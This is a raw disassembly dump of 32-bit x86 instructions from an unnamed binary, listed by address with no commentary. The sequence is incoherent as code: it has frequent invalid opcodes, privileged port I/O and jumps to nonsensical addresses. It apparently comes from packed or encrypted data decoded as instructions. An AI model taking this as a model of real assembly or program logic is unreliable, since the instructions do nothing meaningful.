  41df63:	mov    ch,0x7d
  41df65:	pop    edx
  41df66:	popf   
  41df67:	inc    esi
  41df68:	fist   WORD PTR [ebp+0x54]
  41df6b:	test   al,0x7c
  41df6d:	aad    0x65
  41df6f:	fdiv   st,st(1)
  41df71:	lods   eax,DWORD PTR ds:[esi]
  41df72:	xchg   esi,eax
  41df73:	or     edi,DWORD PTR [esi+0x686bc5fe]
  41df79:	in     al,0xd0
  41df7b:	push   esp
  41df7c:	sbb    cl,BYTE PTR [edx]
  41df7e:	sbb    al,0x8a
  41df80:	dec    esi
  41df81:	rol    bl,cl
  41df83:	mov    ah,0x2d
  41df85:	xchg   ebp,eax
  41df86:	push   esp
  41df87:	adc    edi,DWORD PTR [ebp+0x1113a529]
  41df8d:	xchg   ebx,eax
  41df8e:	mov    ebp,0xaadfaa59
  41df93:	into   
  41df94:	popf   
  41df95:	or     BYTE PTR es:[ebx],cl
  41df98:	inc    edx
  41df99:	je     0x41dffb
  41df9b:	int    0x92
  41df9d:	jle    0x41df28
  41df9f:	jmp    0x41dfcf
  41dfa1:	add    al,0x66
  41dfa3:	push   ebx
  41dfa4:	leave  
  41dfa5:	data16 f2xm1 
  41dfa8:	push   0xca9cc29c
  41dfad:	pushf  
  41dfae:	(bad)  
  41dfaf:	mov    ch,0xf3
  41dfb1:	sbb    eax,0xea7a0ed5
  41dfb6:	stc    
  41dfb7:	mov    bl,0x20
  41dfb9:	pop    es
  41dfba:	call   DWORD PTR [ecx]
  41dfbc:	xchg   ecx,eax
  41dfbd:	repnz mov al,dl
  41dfc0:	push   0x1d649d8f
  41dfc5:	aam    0xe4
  41dfc7:	nop
  41dfc8:	sbb    edi,ebp
  41dfca:	and    BYTE PTR [edx-0x49],ah
  41dfcd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dfce:	xchg   ebp,eax
  41dfcf:	mov    eax,0xf75c818c
  41dfd4:	ja     0x41dfaf
  41dfd6:	bound  eax,QWORD PTR [ecx-0x5b]
  41dfd9:	arpl   dx,ax
  41dfdb:	xlat   BYTE PTR ds:[ebx]
  41dfdc:	sbb    al,0x9d
  41dfde:	mov    ecx,0x5b4cd263
  41dfe3:	into   
  41dfe4:	add    DWORD PTR [edi-0x43],esi
  41dfe7:	jne    0x41dfd0
  41dfe9:	fs pop edi
  41dfeb:	shl    dh,1
  41dfed:	in     al,0x16
  41dfef:	aad    0x28
  41dff1:	out    0x87,eax
  41dff3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dff4:	mov    bh,0xf9
  41dff6:	pop    esi
  41dff7:	rol    BYTE PTR [edx+0x2a],0x7f
  41dffb:	lahf   
  41dffc:	mov    edx,0xad0bb16e
  41e001:	(bad)  
  41e002:	fisubr WORD PTR [ecx-0x5beb9ad7]
  41e008:	sbb    eax,0xec44ca21
  41e00d:	sbb    bh,cl
  41e00f:	mov    ds:0xceda2ec6,al
  41e014:	cs add eax,0x7d2a2955
  41e01a:	scas   al,BYTE PTR es:[edi]
  41e01b:	jbe    0x41e09b
  41e01d:	cmp    al,0x97
  41e01f:	jg     0x9d33bcd9
  41e025:	add    DWORD PTR [ebx+0x25],edx
  41e028:	gs cmp esp,ebx
  41e02b:	push   ebp
  41e02c:	inc    ebx
  41e02d:	shr    BYTE PTR [ebp+0x17],0xd5
  41e031:	scas   eax,DWORD PTR es:[edi]
  41e032:	mov    bh,0x23
  41e034:	sbb    BYTE PTR ds:0xd2d3bf6e,dl
  41e03a:	dec    ebx
  41e03b:	cwde   
  41e03c:	(bad)  
  41e03d:	or     BYTE PTR [ebx],bh
  41e03f:	out    dx,eax
  41e040:	xchg   ecx,eax
  41e041:	shr    BYTE PTR [esi],cl
  41e043:	pop    ds
  41e044:	leave  
  41e045:	int    0x32
  41e047:	ins    BYTE PTR es:[edi],dx
  41e048:	cs push ebx
  41e04a:	cmp    DWORD PTR [esi-0x49],ecx
  41e04d:	mov    DWORD PTR [edx+edx*8+0x9],ecx
  41e051:	inc    esp
  41e052:	(bad)  [eax-0x29]
  41e055:	fist   DWORD PTR [esi-0xdbf605c]
  41e05b:	and    bh,BYTE PTR [ecx+0x4e]
  41e05e:	idiv   BYTE PTR [edi+0x4a8ca219]
  41e064:	les    esp,FWORD PTR [esi-0x15]
  41e067:	cmp    esp,DWORD PTR [eax+0x2ed8fbb]
  41e06d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e06e:	pop    ebp
  41e06f:	ret    0x134
  41e072:	xor    BYTE PTR [ecx],bl
  41e074:	cld    
  41e075:	aam    0x59
  41e077:	mov    esp,0x622c8160
  41e07c:	push   esp
  41e07d:	sti    
  41e07e:	test   DWORD PTR [esi-0x36799059],esi
  41e084:	lods   al,BYTE PTR ds:[esi]
  41e085:	xchg   ecx,eax
  41e086:	sbb    bh,BYTE PTR [ebx+ebx*2-0x51]
  41e08a:	mov    ds:0xaeba43be,eax
  41e08f:	xor    edi,ebp
  41e091:	jb     0x41e021
  41e093:	dec    edi
  41e094:	out    dx,eax
  41e095:	sbb    al,0xb3
  41e097:	and    al,BYTE PTR [esi+0xf9426c4]
  41e09d:	aad    0xb3
  41e09f:	out    0x3e,al
  41e0a1:	outs   dx,BYTE PTR ds:[esi]
  41e0a2:	pushf  
  41e0a3:	mov    bh,0x29
  41e0a5:	mov    cl,bl
  41e0a7:	jge    0x41e085
  41e0a9:	mov    dh,0x71
  41e0ab:	mov    dl,0xb
  41e0ad:	in     eax,dx
  41e0ae:	xchg   edx,eax
  41e0af:	in     eax,dx
  41e0b0:	pop    esp
  41e0b1:	adc    ebp,DWORD PTR [ebx+0x19]
  41e0b4:	call   0x4eb:0xde0fe94e
  41e0bb:	cmp    ebx,DWORD PTR [edx-0x5c]
  41e0be:	cdq    
  41e0bf:	pushf  
  41e0c0:	repz xchg ecx,eax
  41e0c2:	sub    ebp,DWORD PTR [esi]
  41e0c4:	ror    BYTE PTR [eax+0x4b5dd287],1
  41e0ca:	arpl   WORD PTR [ecx],sp
  41e0cc:	dec    ebp
  41e0cd:	push   ebp
  41e0ce:	idiv   BYTE PTR [esp+esi*2+0x1e457225]
  41e0d5:	add    al,0xb5
  41e0d7:	enter  0x4c8b,0x4a
  41e0db:	retf   0x309a
  41e0de:	sti    
  41e0df:	xchg   ebx,eax
  41e0e0:	push   ds
  41e0e1:	out    dx,eax
  41e0e2:	icebp  
  41e0e3:	add    DWORD PTR [ebx],0xffffff81
  41e0e6:	push   0x68
  41e0e8:	rol    DWORD PTR [eax+0x37b1a7cd],1
  41e0ee:	lahf   
  41e0ef:	pop    ebx
  41e0f0:	jle    0x41e0cf
  41e0f2:	add    eax,0x8962071
  41e0f7:	dec    eax
  41e0f8:	push   esp
  41e0f9:	nop
  41e0fa:	mov    ecx,0x1e7f64d9
  41e0ff:	popf   
  41e100:	popa   
  41e101:	push   edx
  41e102:	push   ebp
  41e103:	mov    esi,esp
  41e105:	or     BYTE PTR [esi+0x38fa0d27],dl
  41e10b:	out    dx,al
  41e10c:	push   ds
  41e10d:	je     0x41e0f0
  41e10f:	jb     0x41e0a0
  41e111:	xchg   BYTE PTR [esi+eiz*8],dl
  41e114:	jo     0x41e0c0
  41e116:	jno    0x41e11c
  41e118:	out    dx,al
  41e119:	cdq    
  41e11a:	inc    edi
  41e11b:	mov    ah,0x90
  41e11d:	js     0x41e11a
  41e11f:	in     eax,dx
  41e120:	cs dec esi
  41e122:	into   
  41e123:	retf   
  41e124:	dec    eax
  41e125:	ja     0x41e0e3
  41e127:	dec    ecx
  41e128:	or     al,0xe5
  41e12a:	jbe    0x41e180
  41e12c:	mov    al,ds:0x682539b8
  41e131:	dec    edi
  41e132:	sbb    dh,BYTE PTR [edi+0x2b]
  41e135:	sub    dl,BYTE PTR [esi+0x61]
  41e138:	cmp    eax,0xde1099f3
  41e13d:	jmp    0xf5ce:0xb551fceb
  41e144:	call   0x4614642f
  41e149:	or     esp,DWORD PTR [ebx]
  41e14b:	fiadd  WORD PTR [esi-0x59]
  41e14e:	imul   DWORD PTR [ebp+0x2ff91647]
  41e154:	adc    ebp,esp
  41e156:	jo     0x41e0f7
  41e158:	and    ebp,DWORD PTR [eax-0x3e80617c]
  41e15e:	sub    eax,0x67bc7f79
  41e163:	repnz push es
  41e165:	std    
  41e166:	call   0x4e3b17ad
  41e16b:	repz test BYTE PTR [edi],dl
  41e16e:	in     al,0xbc
  41e170:	cld    
  41e171:	push   edx
  41e172:	mov    edx,0x9d02471e
  41e177:	mov    al,ds:0x9f2d1ec1
  41e17c:	(bad)  
  41e17d:	jg     0x41e13c
  41e17f:	push   ss
  41e180:	sub    ch,BYTE PTR [ebp-0x3868f846]
  41e186:	(bad)
  41e18a:	sub    eax,0x80b25292
  41e18f:	repz adc DWORD PTR [eax+ebx*4+0x17],ebx
  41e194:	adc    DWORD PTR [edx+eiz*2+0x2b],ecx
  41e198:	sub    BYTE PTR ds:0xa1277375,cl
  41e19e:	pop    es
  41e19f:	fld    QWORD PTR [edi+eiz*8-0x1a]
  41e1a3:	in     al,0xd6
  41e1a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e1a6:	push   edi
  41e1a7:	imul   eax,DWORD PTR [ebx],0xffffff9e
  41e1aa:	or     al,0x9f
  41e1ac:	(bad)  
  41e1ad:	loope  0x41e1d2
  41e1af:	mov    edi,fs
  41e1b1:	mov    ebp,0xe4273639
  41e1b6:	cmp    al,BYTE PTR [ebp+0x1a9a75c7]
  41e1bc:	sti    
  41e1bd:	and    BYTE PTR [ebp-0x456234fe],bl
  41e1c3:	fwait
  41e1c4:	(bad)  
  41e1c5:	(bad)  
  41e1c6:	pop    ds
  41e1c7:	lods   al,BYTE PTR ds:[esi]
  41e1c8:	ret    0x6c78
  41e1cb:	xor    al,0xa
  41e1cd:	cld    
  41e1ce:	enter  0x8663,0x12
  41e1d2:	dec    edi
  41e1d3:	mov    ds:0xc545867f,al
  41e1d8:	mov    eax,0x1ddd9259
  41e1dd:	or     bl,BYTE PTR [edi-0x46]
  41e1e0:	sti    
  41e1e1:	xor    ebx,DWORD PTR [ebx]
  41e1e3:	clc    
  41e1e4:	cli    
  41e1e5:	mov    dl,0xd9
  41e1e7:	or     al,0x61
  41e1e9:	mov    bl,0xd4
  41e1eb:	enter  0x44c4,0xd5
  41e1ef:	sub    ah,dh
  41e1f1:	push   es
  41e1f2:	mov    esi,0xa69b4814
  41e1f7:	ss mov edi,0xded592af
  41e1fd:	jecxz  0x41e201
  41e1ff:	mov    esi,0xe9a7c2b9
  41e204:	sbb    esp,DWORD PTR [eax+edx*1-0x57]
  41e208:	push   ebx
  41e209:	sub    ebx,DWORD PTR [edi]
  41e20b:	jnp    0x41e1ed
  41e20d:	shl    BYTE PTR [eax],cl
  41e20f:	pop    ss
  41e210:	and    eax,0xb9e203bd
  41e215:	push   ss
  41e216:	popa   
  41e217:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e218:	lods   al,BYTE PTR ds:[esi]
  41e219:	cmc    
  41e21a:	push   cs
  41e21b:	inc    edx
  41e21c:	add    DWORD PTR [edx],eax
  41e21e:	jns    0x41e246
  41e220:	rol    BYTE PTR fs:[edi+0x3b501c80],0x28
  41e228:	add    DWORD PTR [eax-0x30],ebp
  41e22b:	ss and eax,0x5e49569f
  41e231:	mov    esi,0x88934ad3
  41e236:	xchg   edx,eax
  41e237:	push   ecx
  41e238:	jb     0x41e1c8
  41e23a:	and    al,0x77
  41e23c:	arpl   sp,cx
  41e23e:	dec    eax
  41e23f:	xchg   ecx,eax
  41e240:	stos   BYTE PTR es:[edi],al
  41e241:	mov    WORD PTR [edx+ebp*1-0x4dc42552],cs
  41e248:	rcl    BYTE PTR [ebp-0x46],cl
  41e24b:	push   ecx
  41e24c:	adc    DWORD PTR [ebx],0x7b
  41e24f:	add    ebx,DWORD PTR [eax-0x77d55d10]
  41e255:	cmp    eax,0x2c729d1b
  41e25a:	or     eax,0x197af401
  41e25f:	std    
  41e260:	adc    BYTE PTR [ebp-0x5ccd1ffd],cl
  41e266:	call   0xaaab772b
  41e26b:	ret    0xbc76
  41e26e:	stos   DWORD PTR es:[edi],eax
  41e26f:	bound  esi,QWORD PTR fs:[esi]
  41e272:	in     al,dx
  41e273:	imul   ebp,DWORD PTR [eax-0x68],0x4f
  41e277:	stos   DWORD PTR es:[edi],eax
  41e278:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e279:	sbb    al,0x1
  41e27b:	mov    ebp,0xd8cc3e52
  41e280:	retf   
  41e281:	dec    ebx
  41e282:	cwde   
  41e283:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e284:	mov    WORD PTR [ebx],fs
  41e286:	mov    eax,0xde3cf2ad
  41e28b:	mov    esp,0xc08a9ad3
  41e290:	cmp    al,0xc9
  41e292:	pop    ecx
  41e293:	push   esp
  41e294:	jae    0x41e2e8
  41e296:	out    dx,eax
  41e297:	rcr    BYTE PTR [esi+0x16],1
  41e29a:	addr16 inc ecx
  41e29c:	xchg   edi,eax
  41e29d:	ficomp WORD PTR [edi+0x16]
  41e2a0:	add    ebx,esp
  41e2a2:	jne    0x41e288
  41e2a4:	(bad)  
  41e2a5:	in     al,0x3f
  41e2a7:	fmul   QWORD PTR [edi]
  41e2a9:	push   ss
  41e2aa:	ins    DWORD PTR es:[edi],dx
  41e2ab:	dec    eax
  41e2ac:	inc    edi
  41e2ad:	jo     0x41e30f
  41e2af:	sub    dl,ch
  41e2b1:	aad    0xfc
  41e2b3:	lods   al,BYTE PTR ds:[esi]
  41e2b4:	leave  
  41e2b5:	iret   
  41e2b6:	adc    ch,BYTE PTR [ebx]
  41e2b8:	fidivr WORD PTR [ecx+edi*2]
  41e2bb:	fwait
  41e2bc:	push   ecx
  41e2bd:	jge    0x41e2b7
  41e2bf:	in     eax,dx
  41e2c0:	and    edi,DWORD PTR [esi+0x5141f2d3]
  41e2c6:	and    al,0x33
  41e2c8:	inc    esi
  41e2c9:	(bad)  
  41e2ca:	out    dx,eax
  41e2cb:	push   esp
  41e2cc:	stos   DWORD PTR es:[edi],eax
  41e2cd:	jl     0x41e339
  41e2cf:	ficom  WORD PTR [ebx-0x1cf5850b]
  41e2d5:	test   eax,ebx
  41e2d7:	test   DWORD PTR [edx-0x7ba9e1e0],ecx
  41e2dd:	mov    dl,0x6d
  41e2df:	out    0x5a,eax
  41e2e1:	add    bh,ah
  41e2e3:	xor    al,0x1
  41e2e5:	aaa    
  41e2e6:	jl     0x41e2e9
  41e2e8:	popf   
  41e2e9:	xchg   ecx,eax
  41e2ea:	mov    DWORD PTR gs:[edi+0x26],0xaf0fe0e5
  41e2f2:	je     0x41e30e
  41e2f4:	(bad)  
  41e2f5:	cmp    BYTE PTR [eax+0x33],ah
  41e2f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e2f9:	lds    edi,FWORD PTR [edx+ebx*8+0x5c9c2da2]
  41e300:	mov    ecx,0xdb72d90a
  41e305:	dec    ebx
  41e306:	sahf   
  41e307:	cmp    DWORD PTR [eax],edx
  41e309:	gs push ss
  41e30b:	inc    esp
  41e30c:	iret   
  41e30d:	es jmp 0x4a95c168
  41e313:	or     DWORD PTR [esi-0x4fe04dc5],ecx
  41e319:	xchg   esi,eax
  41e31a:	and    DWORD PTR [esi-0x50f97003],ebp
  41e320:	xlat   BYTE PTR ds:[ebx]
  41e321:	sub    ecx,esp
  41e323:	(bad)  
  41e324:	lahf   
  41e325:	cmp    eax,esp
  41e327:	mov    BYTE PTR [edx+0x2e],ch
  41e32a:	popf   
  41e32b:	mul    DWORD PTR [edx-0x3fcbc676]
  41e331:	sbb    bl,BYTE PTR [eax+0x22]
  41e334:	lds    ebx,FWORD PTR [edx]
  41e336:	ficom  WORD PTR [eax]
  41e338:	sti    
  41e339:	inc    edi
  41e33a:	add    dh,dh
  41e33c:	in     al,0xb2
  41e33e:	pop    esi
  41e33f:	(bad)  
  41e340:	shr    DWORD PTR [edx-0x3ccc1ae],cl
  41e346:	popf   
  41e347:	in     al,0xe0
  41e349:	cli    
  41e34a:	inc    ecx
  41e34b:	mov    esp,0x6d7e9280
  41e350:	push   esp
  41e351:	lock and cl,BYTE PTR [eax-0x67]
  41e355:	sbb    DWORD PTR [ebp+0x21],esi
  41e358:	scas   eax,DWORD PTR es:[edi]
  41e359:	cmp    DWORD PTR [eax],ecx
  41e35b:	adc    al,0x56
  41e35d:	(bad)  [ecx-0x170d69fc]
  41e363:	scas   al,BYTE PTR es:[edi]
  41e364:	mov    BYTE PTR [edx-0xe],dh
  41e367:	mov    esp,DWORD PTR [ebx]
  41e369:	inc    ebx
  41e36a:	hlt    
  41e36b:	rcl    DWORD PTR [esi],1
  41e36d:	sar    BYTE PTR [eax+0x3e10f5ec],1
  41e373:	in     al,dx
  41e374:	sbb    al,0x5c
  41e376:	out    dx,al
  41e377:	xor    esi,ecx
  41e379:	fidivr DWORD PTR [edi]
  41e37b:	xchg   esp,eax
  41e37c:	sub    BYTE PTR [edi],0xef
  41e37f:	mov    dh,0xa9
  41e381:	ins    DWORD PTR es:[edi],dx
  41e382:	adc    DWORD PTR [ecx],ebp
  41e384:	sbb    al,0x53
  41e386:	jge    0x41e394
  41e388:	test   BYTE PTR [eax],0xb6
  41e38b:	jno    0x41e367
  41e38d:	test   eax,0x239e8f97
  41e392:	aas    
  41e393:	dec    esi
  41e394:	ret    0x59ba
  41e397:	push   cs
  41e398:	sti    
  41e399:	mov    cl,0x3a
  41e39b:	jbe    0x41e3ef
  41e39d:	pop    es
  41e39e:	jp     0x41e325
  41e3a0:	cmc    
  41e3a1:	std    
  41e3a2:	and    al,0x30
  41e3a4:	xchg   esp,eax
  41e3a5:	xchg   esp,eax
  41e3a6:	jns    0x41e39e
  41e3a8:	test   BYTE PTR [ebp-0x2c4e8498],cl
  41e3ae:	inc    edx
  41e3af:	jb     0x41e398
  41e3b1:	sub    ebx,DWORD PTR [edi+0x1a9f5b06]
  41e3b7:	pop    esi
  41e3b8:	jge    0x41e3e9
  41e3ba:	loopne 0x41e393
  41e3bc:	sbb    al,0xc3
  41e3be:	cmp    DWORD PTR [eax],edi
  41e3c0:	dec    ecx
  41e3c1:	push   cs
  41e3c2:	sub    al,0xf2
  41e3c4:	test   DWORD PTR [edi-0x1a],ebp
  41e3c7:	dec    esp
  41e3c8:	in     eax,0x54
  41e3ca:	test   DWORD PTR [ecx],esp
  41e3cc:	pusha  
  41e3cd:	hlt    
  41e3ce:	mov    DWORD PTR [edx-0x6adcf4c2],0x5ba345aa
  41e3d8:	pushf  
  41e3d9:	in     eax,dx
  41e3da:	pop    edx
  41e3db:	jecxz  0x41e419
  41e3dd:	cld    
  41e3de:	mov    dl,0xa1
  41e3e0:	jle    0x41e45f
  41e3e2:	mov    ebp,0x3c3530f7
  41e3e7:	push   edx
  41e3e8:	bound  edx,QWORD PTR [ebp+0x3]
  41e3eb:	je     0x41e3a5
  41e3ed:	mov    es,WORD PTR [edi-0x5b5e07de]
  41e3f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e3f4:	mul    dh
  41e3f6:	or     esi,DWORD PTR [ecx-0x6]
  41e3f9:	ins    BYTE PTR es:[edi],dx
  41e3fa:	aaa    
  41e3fb:	mov    WORD PTR [eax],?
  41e3fd:	dec    edx
  41e3fe:	adc    ebp,ebx
  41e400:	aaa    
  41e401:	jp     0x41e424
  41e403:	bound  ecx,QWORD PTR [esi-0x2b]
  41e406:	(bad)  
  41e407:	int3   
  41e408:	push   ebp
  41e409:	adc    eax,0xe5e2e565
  41e40e:	pop    edx
  41e40f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e410:	psrad  mm0,QWORD PTR [eax+0x123b64da]
  41e417:	cmp    DWORD PTR [edx],ebp
  41e419:	mov    WORD PTR [edx+0x423c465a],cs
  41e41f:	retf   0x63f3
  41e422:	loopne 0x41e40f
  41e424:	stos   DWORD PTR es:[edi],eax
  41e425:	sti    
  41e426:	push   cs
  41e427:	and    DWORD PTR [eax+0x57eb4335],esp
  41e42d:	cmp    DWORD PTR [ebx+0x5b],ebp
  41e430:	test   BYTE PTR [ecx-0x2fad5000],bh
  41e436:	mov    eax,ds:0x487a5fc7
  41e43b:	ins    DWORD PTR es:[edi],dx
  41e43c:	sbb    BYTE PTR [eax-0x352173ed],cl
  41e442:	pop    ebx
  41e443:	imul   DWORD PTR [ebx-0x10247274]
  41e449:	mov    dl,0x17
  41e44b:	mov    ds:0x1a126fe7,al
  41e450:	neg    DWORD PTR [ecx]
  41e452:	inc    edi
  41e453:	into   
  41e454:	retf   
  41e455:	jmp    0xc92c3d71
  41e45a:	mov    bh,0xa3
  41e45c:	adc    DWORD PTR [eax+0x1e],0x66a2368e
  41e463:	xchg   ebx,eax
  41e464:	or     ah,BYTE PTR [eax]
  41e466:	addr16 add eax,0xfb118071
  41e46c:	mov    cl,0xb6
  41e46e:	jae    0x41e4ae
  41e470:	mov    DWORD PTR [ecx],eax
  41e472:	inc    ecx
  41e473:	out    0x4c,eax
  41e475:	(bad)  [ecx+esi*4-0x169b532f]
  41e47c:	daa    
  41e47d:	inc    ebp
  41e47e:	inc    edi
  41e47f:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  41e481:	sbb    DWORD PTR [esi+0x1fa6ccd0],eax
  41e487:	xchg   edx,eax
  41e488:	pop    eax
  41e489:	addr16 mov dl,0xd5
  41e48c:	mov    eax,ss
  41e48e:	and    DWORD PTR [ecx-0x3a],esp
  41e491:	jle    0x41e425
  41e493:	cmp    ch,dh
  41e495:	(bad)  
  41e496:	cli    
  41e497:	ss fs in eax,0x77
  41e49b:	pop    ecx
  41e49c:	fld    DWORD PTR [ecx-0x4c]
  41e49f:	jnp    0x41e42f
  41e4a1:	mov    dl,0xdc
  41e4a3:	ret    
  41e4a4:	ffree  st(3)
  41e4a6:	inc    eax
  41e4a7:	retf   
  41e4a8:	lods   eax,DWORD PTR ds:[esi]
  41e4a9:	inc    esi
  41e4aa:	das    
  41e4ab:	pop    ebp
  41e4ac:	scas   al,BYTE PTR es:[edi]
  41e4ad:	xor    eax,0xcd31113
  41e4b2:	jge    0x41e4b2
  41e4b4:	lahf   
  41e4b5:	test   DWORD PTR [edx],0x1d64e337
  41e4bb:	iret   
  41e4bc:	scas   eax,DWORD PTR es:[edi]
  41e4bd:	mov    ah,ch
  41e4bf:	ror    BYTE PTR [edx-0x23],1
  41e4c2:	fcmovbe st,st(5)
  41e4c4:	sub    al,0x78
  41e4c6:	shl    BYTE PTR [edx+0x43],0x85
  41e4ca:	jg     0x41e472
  41e4cc:	stos   BYTE PTR es:[edi],al
  41e4cd:	adc    BYTE PTR [ebp-0x48],al
  41e4d0:	fsubr  st(6),st
  41e4d2:	ins    DWORD PTR es:[edi],dx
  41e4d3:	push   0x66ea2e32
  41e4d8:	xchg   BYTE PTR ds:0x166e434b,bh
  41e4de:	retf   0x9cee
  41e4e1:	jecxz  0x41e54e
  41e4e3:	sti    
  41e4e4:	imul   ebp,DWORD PTR [edx-0x771a462d],0xee0a9a42
  41e4ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e4ef:	inc    esi
  41e4f0:	fndisi(8087 only) 
  41e4f2:	jge    0x41e4f3
  41e4f4:	push   esi
  41e4f5:	xchg   ebp,eax
  41e4f6:	adc    bl,al
  41e4f8:	sub    al,0x8
  41e4fa:	mov    ecx,0xf66c4f95
  41e4ff:	stos   DWORD PTR es:[edi],eax
  41e500:	out    0x2c,eax
  41e502:	mov    bh,0xd
  41e504:	and    ah,cl
  41e506:	lahf   
  41e507:	mov    ecx,0xdfeb88c1
  41e50c:	add    ebx,DWORD PTR [ebx-0x78]
  41e50f:	lahf   
  41e510:	mov    ebx,0x8d505643
  41e515:	arpl   WORD PTR [esi+eax*8+0x5fd0c0bf],bp
  41e51c:	mov    ebx,0x17041f3e
  41e521:	cld    
  41e522:	sahf   
  41e523:	xchg   esp,eax
  41e524:	jae    0x41e4e5
  41e526:	xchg   ebp,eax
  41e527:	mov    bh,0x51
  41e529:	xchg   ebp,eax
  41e52a:	push   ecx
  41e52b:	popa   
  41e52c:	cmp    dh,BYTE PTR [esi-0x6b]
  41e52f:	arpl   WORD PTR [esi+0x2b4ec690],di
  41e535:	xchg   edi,eax
  41e536:	in     al,dx
  41e537:	adc    ch,BYTE PTR ds:0xc3fcb5f
  41e53d:	icebp  
  41e53e:	imul   ebp
  41e540:	lock test ch,ch
  41e543:	add    DWORD PTR [edi],ebp
  41e545:	dec    esp
  41e546:	fstp   DWORD PTR [esi]
  41e548:	push   esi
  41e549:	and    al,0x2c
  41e54b:	(bad)  
  41e54c:	jge    0x41e522
  41e54e:	fsub   DWORD PTR [edi-0x50]
  41e551:	pop    ss
  41e552:	sbb    cl,bl
  41e554:	mov    cs,WORD PTR [ecx+ebp*8-0x4e]
  41e558:	adc    bh,BYTE PTR ds:0xb7e52e5a
  41e55e:	outs   dx,BYTE PTR ds:[esi]
  41e55f:	jmp    0xf7dc:0x93be2aee
  41e566:	js     0x41e566
  41e568:	xchg   ecx,eax
  41e569:	ret    
  41e56a:	push   ebx
  41e56b:	in     al,dx
  41e56c:	or     DWORD PTR [eax],esp
  41e56e:	outs   dx,BYTE PTR ds:[esi]
  41e56f:	jle    0x41e58e
  41e571:	retf   
  41e572:	push   edx
  41e573:	dec    edx
  41e574:	xor    dl,al
  41e576:	cmp    edx,0x6011e431
  41e57c:	dec    ebp
  41e57d:	addr16 test ebp,ebx
  41e580:	rcr    DWORD PTR [ecx+esi*8],1
  41e583:	bound  ebp,QWORD PTR [ecx-0xb79a041]
  41e589:	je     0x41e59c
  41e58b:	addr16 xchg edi,eax
  41e58d:	mov    bh,0xd8
  41e58f:	dec    ebx
  41e590:	add    al,dl
  41e592:	inc    esi
  41e593:	pop    edx
  41e594:	mov    eax,DWORD PTR [eax+0xd214e0]
  41e59a:	stc    
  41e59b:	retf   0x744a
  41e59e:	loope  0x41e5de
  41e5a0:	add    BYTE PTR ds:0xd41e4172,ch
  41e5a6:	or     BYTE PTR [ecx+0x6380f435],ch
  41e5ac:	fimul  WORD PTR [ecx+0x4e]
  41e5af:	xor    dh,dh
  41e5b1:	sbb    eax,0xbd9e549c
  41e5b6:	dec    edi
  41e5b7:	or     BYTE PTR [edi],dl
  41e5b9:	and    eax,0xe442927d
  41e5be:	sub    eax,0x45a8aee6
  41e5c3:	cmp    BYTE PTR ds:0x1a1e7fd7,0xfc
  41e5ca:	push   ebp
  41e5cb:	or     al,0xa5
  41e5cd:	pop    ss
  41e5ce:	mov    ds:0x255b69dc,eax
  41e5d3:	inc    esp
  41e5d4:	mov    DWORD PTR [edi],ebx
  41e5d6:	data16 icebp 
  41e5d8:	cdq    
  41e5d9:	ds xchg ebp,eax
  41e5db:	into   
  41e5dc:	mov    bh,0xd0
  41e5de:	arpl   WORD PTR [esi+0x2f8c43fd],dx
  41e5e4:	(bad)  
  41e5e5:	(bad)  
  41e5e6:	in     eax,dx
  41e5e7:	(bad)  
  41e5e8:	es add al,0x64
  41e5eb:	mov    eax,ds:0x23032709
  41e5f0:	scas   al,BYTE PTR es:[edi]
  41e5f1:	(bad)  
  41e5f2:	or     al,0xe3
  41e5f4:	sbb    al,0xdc
  41e5f6:	ret    
  41e5f7:	lods   eax,DWORD PTR ds:[esi]
  41e5f9:	enter  0x54da,0x89
  41e5fd:	mov    ds,WORD PTR [esi+0x135dabc9]
  41e603:	mov    ch,0xa5
  41e605:	inc    ecx
  41e606:	sub    bh,ch
  41e608:	push   eax
  41e609:	push   ebp
  41e60a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e60b:	jecxz  0x41e632
  41e60d:	jnp    0x41e64c
  41e60f:	cmp    al,0x64
  41e611:	mov    ebx,0x5ecbb779
  41e616:	(bad)  
  41e617:	pop    edx
  41e618:	pop    ebp
  41e619:	add    al,BYTE PTR [edi+0x159dfcdb]
  41e61f:	hlt    
  41e620:	push   eax
  41e621:	ret    0x3858
  41e624:	push   ecx
  41e625:	loope  0x41e5b3
  41e627:	push   0x56
  41e629:	mov    eax,0xf7b1dc6c
  41e62e:	lods   al,BYTE PTR ds:[esi]
  41e62f:	retf   0x3439
  41e632:	ins    DWORD PTR es:[edi],dx
  41e633:	(bad)
  41e637:	sbb    al,0x59
  41e639:	push   ds
  41e63a:	scas   eax,DWORD PTR es:[edi]
  41e63b:	pop    edx
  41e63c:	adc    al,0x77
  41e63e:	ja     0x41e627
  41e640:	ins    DWORD PTR es:[edi],dx
  41e641:	cs push ecx
  41e643:	add    al,BYTE PTR [edx-0x43]
  41e646:	(bad)  
  41e647:	call   0x52fc:0xe8e88892
  41e64e:	inc    ebx
  41e64f:	bound  eax,QWORD PTR [ecx]
  41e651:	adc    DWORD PTR [eax+0x4f],ebp
  41e654:	cs dec ebx
  41e656:	or     edx,ebp
  41e658:	ins    DWORD PTR es:[edi],dx
  41e659:	hlt    
  41e65a:	cmp    DWORD PTR [edx-0x47],ebx
  41e65d:	data16 add ch,BYTE PTR [ebp+0x359e9db1]
  41e664:	stos   DWORD PTR es:[edi],eax
  41e665:	sbb    esp,DWORD PTR [ecx-0x2559777d]
  41e66b:	ret    
  41e66c:	int3   
  41e66d:	shl    DWORD PTR [eax-0x6b],0x1c
  41e671:	rol    cl,cl
  41e673:	add    dl,al
  41e675:	test   DWORD PTR [ecx-0x16697073],0x2dd8e380
  41e67f:	jle    0x41e6a2
  41e681:	pop    ds
  41e682:	lods   eax,DWORD PTR ds:[esi]
  41e683:	repz sub edx,DWORD PTR [ebp+0x5f]
  41e687:	or     ebx,DWORD PTR [ecx+0x2854ff6d]
